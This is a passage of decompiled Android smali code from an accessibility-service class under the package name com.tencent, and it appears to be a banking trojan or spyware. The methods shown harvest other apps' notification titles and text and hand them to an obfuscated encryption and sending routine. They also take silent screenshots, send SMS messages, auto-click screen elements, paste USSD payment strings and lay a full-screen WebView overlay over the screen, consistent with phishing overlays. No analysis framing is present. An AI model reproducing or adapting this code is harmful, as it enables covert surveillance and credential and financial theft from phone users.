    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V

    .line 3616
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda11;

    invoke-direct {v1, p0}, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda11;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 3626
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_0
    return-void
.end method

.method private continueclickBtn(I)V
    .locals 2

    .line 3575
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->clickSendButton()V

    .line 3576
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda12;

    invoke-direct {v1, p0, p1}, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda12;-><init>(Lcom/tencent/AccessibilityServiceCore;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 3584
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private continued()V
    .locals 2

    .line 3633
    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    if-eqz v0, :cond_0

    .line 3634
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sget-object v0, Lcom/tencent/MainBackgroundService;->ussdpayd:Ljava/lang/String;

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 3635
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 3636
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V

    .line 3637
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda10;

    invoke-direct {v1, p0}, Lcom/tencent/AccessibilityServiceCore$$ExternalSyntheticLambda10;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 3644
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_0
    return-void
.end method

.method private continuee()V
    .locals 0

    .line 3651
    invoke-direct {p0}, Lcom/tencent/AccessibilityServiceCore;->clickSendButton()V

    return-void
.end method

.method private drawViewHierarchy(Landroid/graphics/Canvas;Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/graphics/Paint;)V
    .locals 10

    if-eqz p2, :cond_a

    .line 2756
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_5

    :cond_0
    const/4 v0, 0x0

    move v1, v0

    .line 2759
    :goto_0
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    if-ge v1, v2, :cond_a

    .line 2760
    invoke-virtual {p2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_9

    .line 2762
    new-instance v3, Landroid/graphics/Rect;

    invoke-direct {v3}, Landroid/graphics/Rect;-><init>()V

    .line 2763
    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    const/high16 v4, 0x41900000    # 18.0f

    .line 2765
    invoke-virtual {p3, v4}, Landroid/graphics/Paint;->setTextSize(F)V

    .line 2768
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/4 v6, -0x1

    const/4 v7, 0x1

    sparse-switch v5, :sswitch_data_0

    :goto_1
    move v4, v6

    goto :goto_2

    :sswitch_0
    const-string v5, "android.widget.RadioButton"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1

    goto :goto_1

    :cond_1
    const/4 v4, 0x5

    goto :goto_2

    :sswitch_1
    const-string v5, "android.widget.Button"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_2

    goto :goto_1

    :cond_2
    const/4 v4, 0x4

    goto :goto_2

    :sswitch_2
    const-string v5, "android.widget.TextView"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_3

    goto :goto_1

    :cond_3
    const/4 v4, 0x3

    goto :goto_2

    :sswitch_3
    const-string v5, "android.widget.EditText"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_4

    goto :goto_1

    :cond_4
    const/4 v4, 0x2

    goto :goto_2

    :sswitch_4
    const-string v5, "android.widget.CheckBox"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_5

    goto :goto_1

    :cond_5
    move v4, v7

    goto :goto_2

    :sswitch_5
    const-string v5, "android.widget.ToggleButton"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_6

    goto :goto_1

    :cond_6
    move v4, v0

    :goto_2
    const/high16 v5, 0x41800000    # 16.0f

    packed-switch v4, :pswitch_data_0

    .line 2791
    invoke-virtual {p3, v5}, Landroid/graphics/Paint;->setTextSize(F)V

    const v4, -0x777778

    goto :goto_3

    :pswitch_0
    const v4, -0xff0100

    goto :goto_3

    :pswitch_1
    const v4, -0xffff01

    goto :goto_3

    :pswitch_2
    const/high16 v4, 0x42040000    # 33.0f

    .line 2787
    invoke-virtual {p3, v4}, Landroid/graphics/Paint;->setTextSize(F)V

    const/high16 v4, -0x10000

    goto :goto_3

    :pswitch_3
    const/high16 v4, 0x41f00000    # 30.0f

    .line 2783
    invoke-virtual {p3, v4}, Landroid/graphics/Paint;->setTextSize(F)V

    const v4, -0xff0001

    goto :goto_3

    :pswitch_4
    const v4, -0xff01

    goto :goto_3

    :pswitch_5
    const/16 v4, -0x100

    .line 2795
    :goto_3
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    if-eqz v8, :cond_7

    .line 2796
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    goto :goto_4

    .line 2797
    :cond_7
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v8

    if-eqz v8, :cond_8

    .line 2798
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    goto :goto_4

    :cond_8
    const-string v8, ""

    .line 2803
    :goto_4
    sget-object v9, Landroid/graphics/Paint$Style;->STROKE:Landroid/graphics/Paint$Style;

    invoke-virtual {p3, v9}, Landroid/graphics/Paint;->setStyle(Landroid/graphics/Paint$Style;)V

    const/high16 v9, 0x40000000    # 2.0f

    .line 2804
    invoke-virtual {p3, v9}, Landroid/graphics/Paint;->setStrokeWidth(F)V

    .line 2806
    invoke-virtual {p1, v3, p3}, Landroid/graphics/Canvas;->drawRect(Landroid/graphics/Rect;Landroid/graphics/Paint;)V

    .line 2808
    sget-object v9, Landroid/graphics/Paint$Style;->STROKE:Landroid/graphics/Paint$Style;

    invoke-virtual {p3, v9}, Landroid/graphics/Paint;->setStyle(Landroid/graphics/Paint$Style;)V

    .line 2809
    invoke-virtual {p3, v6}, Landroid/graphics/Paint;->setColor(I)V

    .line 2810
    invoke-virtual {p1, v3, p3}, Landroid/graphics/Canvas;->drawRect(Landroid/graphics/Rect;Landroid/graphics/Paint;)V

    .line 2812
    invoke-virtual {p3, v4}, Landroid/graphics/Paint;->setColor(I)V

    .line 2813
    invoke-virtual {p3, v7}, Landroid/graphics/Paint;->setAntiAlias(Z)V

    .line 2814
    iget v4, v3, Landroid/graphics/Rect;->left:I

    add-int/lit8 v4, v4, 0x10

    int-to-float v4, v4

    invoke-virtual {v3}, Landroid/graphics/Rect;->exactCenterY()F

    move-result v3

    add-float/2addr v3, v5

    invoke-virtual {p1, v8, v4, v3, p3}, Landroid/graphics/Canvas;->drawText(Ljava/lang/String;FFLandroid/graphics/Paint;)V

    .line 2816
    invoke-direct {p0, p1, v2, p3}, Lcom/tencent/AccessibilityServiceCore;->drawViewHierarchy(Landroid/graphics/Canvas;Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/graphics/Paint;)V

    .line 2817
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_9
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_0

    :cond_a
    :goto_5
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x68d3decf -> :sswitch_5
        -0xcc5bd52 -> :sswitch_4
        -0x8e34e9e -> :sswitch_3
        0x5bce347d -> :sswitch_2
        0x5e640cfd -> :sswitch_1
        0x632a0022 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public static getApplicationName(Landroid/content/Context;)Ljava/lang/String;
    .locals 2

    .line 2669
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 2670
    iget v1, v0, Landroid/content/pm/ApplicationInfo;->labelRes:I

    if-nez v1, :cond_0

    .line 2671
    iget-object p0, v0, Landroid/content/pm/ApplicationInfo;->nonLocalizedLabel:Ljava/lang/CharSequence;

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    invoke-virtual {p0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object p0

    :goto_0
    return-object p0
.end method

.method public static getTransparentBitmap(Landroid/graphics/Bitmap;I)Landroid/graphics/Bitmap;
    .locals 10

    .line 900
    sget-object v0, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Landroid/graphics/Bitmap;->copy(Landroid/graphics/Bitmap$Config;Z)Landroid/graphics/Bitmap;

    move-result-object p0

    const/high16 v0, 0x42a00000    # 80.0f

    .line 901
    invoke-static {p0, v0}, Lcom/tencent/AccessibilityServiceCore;->applyExposure(Landroid/graphics/Bitmap;F)Landroid/graphics/Bitmap;

    move-result-object p0

    .line 902
    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v0

    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v1

    mul-int/2addr v0, v1

    new-array v9, v0, [I

    const/4 v3, 0x0

    .line 904
    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    .line 906
    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v7

    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v8

    move-object v1, p0

    move-object v2, v9

    .line 904
    invoke-virtual/range {v1 .. v8}, Landroid/graphics/Bitmap;->getPixels([IIIIIII)V

    mul-int/lit16 p1, p1, 0xff

    .line 908
    div-int/lit8 p1, p1, 0x64

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    shl-int/lit8 v2, p1, 0x18

    .line 912
    aget v3, v9, v1

    const v4, 0xffffff

    and-int/2addr v3, v4

    or-int/2addr v2, v3

    aput v2, v9, v1

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 916
    :cond_0
    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result p1

    .line 918
    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result p0

    sget-object v0, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    .line 916
    invoke-static {v9, p1, p0, v0}, Landroid/graphics/Bitmap;->createBitmap([IIILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object p0

    return-object p0
.end method

.method private loadMyPage(Landroid/webkit/WebView;)V
    .locals 2

    .line 3672
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v1, -0x1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 3673
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->height:I

    .line 3674
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    invoke-virtual {v0}, Landroid/widget/FrameLayout;->getChildCount()I

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    invoke-virtual {v0}, Landroid/widget/FrameLayout;->removeAllViews()V

    .line 3677
    :cond_0
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    const v1, -0x7fb3f8e0

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 3678
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    invoke-virtual {v0, p1}, Landroid/widget/FrameLayout;->addView(Landroid/view/View;)V

    .line 3680
    sget-object p1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012wm:Landroid/view/WindowManager;

    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {p1, v0, v1}, Landroid/view/WindowManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 3681
    sget-object p1, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/widget/FrameLayout;->setVisibility(I)V

    return-void
.end method

.method private screenShot()V
    .locals 6

    .line 938
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v0}, Landroid/widget/FrameLayout;->getVisibility()I

    move-result v0

    const/4 v1, 0x0

    const/16 v2, 0x9

    const/16 v3, 0x108

    const-string v4, "Screenshots"

    const/16 v5, 0x1e

    if-nez v0, :cond_1

    .line 939
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v5, :cond_0

    .line 940
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;)Ljava/util/concurrent/Executor;

    move-result-object v0

    new-instance v2, Lcom/tencent/AccessibilityServiceCore$8;

    invoke-direct {v2, p0}, Lcom/tencent/AccessibilityServiceCore$8;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-virtual {p0, v1, v0, v2}, Lcom/tencent/AccessibilityServiceCore;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    goto/16 :goto_0

    .line 988
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Landroid/os/Environment;->DIRECTORY_PICTURES:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 991
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$9;

    invoke-direct {v1, p0, v0, v3}, Lcom/tencent/AccessibilityServiceCore$9;-><init>(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;I)V

    .line 1036
    invoke-virtual {v1}, Landroid/os/FileObserver;->startWatching()V

    .line 1037
    invoke-virtual {p0, v2}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    goto :goto_0

    .line 1042
    :cond_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v5, :cond_2

    .line 1043
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;)Ljava/util/concurrent/Executor;

    move-result-object v0

    new-instance v2, Lcom/tencent/AccessibilityServiceCore$10;

    invoke-direct {v2, p0}, Lcom/tencent/AccessibilityServiceCore$10;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-virtual {p0, v1, v0, v2}, Lcom/tencent/AccessibilityServiceCore;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    goto :goto_0

    .line 1091
    :cond_2
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Landroid/os/Environment;->DIRECTORY_PICTURES:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 1094
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$11;

    invoke-direct {v1, p0, v0, v3}, Lcom/tencent/AccessibilityServiceCore$11;-><init>(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;I)V

    .line 1139
    invoke-virtual {v1}, Landroid/os/FileObserver;->startWatching()V

    .line 1140
    invoke-virtual {p0, v2}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    :goto_0
    return-void
.end method

.method public static sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    .line 129
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v1, p0

    move-object v3, p1

    .line 130
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method private tunesxconcerningn1012SendNotifi(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 5

    const-string v0, "|"

    .line 2913
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getParcelableData()Landroid/os/Parcelable;

    move-result-object v1

    check-cast v1, Landroid/app/Notification;

    if-nez v1, :cond_0

    return-void

    .line 2917
    :cond_0
    iget-object v2, v1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v3, "android.title"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 2918
    iget-object v1, v1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v3, "android.text"

    invoke-virtual {v1, v3}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    .line 2920
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    .line 2921
    invoke-static {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 2922
    sget-object v3, Lcom/tencent/DataPackagingEngine;->N_tunesxconcerningn103_F:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "|."

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v3, p1}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static tunesxconcerningn1012clickAtPosition(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 2

    if-nez p2, :cond_0

    return-void

    .line 3324
    :cond_0
    :try_start_0
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/16 v1, 0x10

    if-nez v0, :cond_1

    .line 3325
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    .line 3326
    invoke-virtual {p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 3327
    invoke-virtual {v0, p0, p1}, Landroid/graphics/Rect;->contains(II)Z

    move-result p0

    if-eqz p0, :cond_3

    .line 3329
    invoke-virtual {p2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    .line 3333
    :cond_1
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    .line 3334
    invoke-virtual {p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 3335
    invoke-virtual {v0, p0, p1}, Landroid/graphics/Rect;->contains(II)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 3337
    invoke-virtual {p2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    const/4 v0, 0x0

    .line 3340
    :goto_0
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_3

    .line 3341
    invoke-virtual {p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-static {p0, p1, v1}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012clickAtPosition(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    :cond_3
    :goto_1
    return-void
.end method

.method public static tunesxconcerningn1012clickByText(Ljava/lang/String;)Z
    .locals 0

    .line 2878
    invoke-static {p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012findNodesByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    invoke-static {p0}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012performClick(Ljava/util/List;)Z

    move-result p0

    return p0
.end method

.method public static tunesxconcerningn1012findNodesByText(Ljava/lang/String;)Ljava/util/List;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/List<",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            ">;"
        }
    .end annotation

    .line 2859
    invoke-static {}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012getRootNodeInfo()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 2861
    invoke-virtual {v0, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    return-object p0

    :cond_0
    const/4 p0, 0x0

    return-object p0
.end method

.method public static tunesxconcerningn1012getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .line 2930
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p0

    const/16 v0, 0x80

    .line 2931
    invoke-virtual {p0, p1, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object p1

    .line 2932
    invoke-virtual {p0, p1}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object p0

    check-cast p0, Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    const-string p0, ""

    return-object p0
.end method

.method private static tunesxconcerningn1012getRootNodeInfo()Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 1

    .line 2868
    sget-object v0, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    return-object v0
.end method

